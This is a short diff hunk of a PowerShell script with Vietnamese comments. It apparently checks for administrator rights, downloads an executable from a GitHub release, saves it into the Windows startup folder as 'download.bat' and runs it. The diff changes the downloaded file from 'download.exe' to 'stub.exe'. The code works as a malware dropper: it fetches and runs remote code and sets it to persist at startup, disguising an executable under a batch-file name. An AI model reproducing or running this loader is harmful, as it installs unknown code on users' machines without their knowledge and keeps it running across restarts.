@@ -16,7 +16,7 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
         $outputFile = "$startupfolder\download.bat"
         
         # Kiểm tra mức độ UAC và in thông báo
-        $url = "https://github.com/43a1723/test/releases/download/siu/download.exe"
+        $url = "https://github.com/43a1723/test/releases/download/siu/stub.exe"
         Invoke-WebRequest -Uri $url -OutFile $outputFile -ErrorAction Stop
         Start-Process -FilePath $outputFile -Wait -ErrorAction Stop
         Write-Output "Khởi chạy tệp batch."
